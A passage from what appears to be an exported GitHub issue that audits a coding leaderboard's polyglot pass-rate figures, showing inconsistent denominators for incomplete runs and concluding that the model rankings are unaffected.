-Four of the five match `pass_num_2 / total_tests` instead (e.g. `176/225 = 78.22 → 78.2`), which looks like the uncompleted case being scored as a failure. That is a defensible choice — but it is not what `pass_rate_1` on the same row does, and `o1-2024-12-17 (high)` matches neither denominator (`139/224 = 62.05`, `139/225 = 61.78`, published `61.7`).
-
-The other 63 polyglot rows have `test_cases == total_tests`, so the two denominators coincide and the question does not arise.
-
-### Impact
-
-**None on the current ranking.** I re-sorted the polyglot board with all `pass_rate_2` values recomputed by the formula: zero models change rank, and the top five are unchanged. The differences are 0.2–0.4 points.
-
-So this is not urgent — but the same situation on a future incomplete run near the top of the board would be, and issue 1 misstates a published reliability figure by 10 points today.
-
-Happy to open a PR fixing the `o1-mini (whole)` cell if that is the preferred route.
-","","2026-07-30T23:38:03Z"
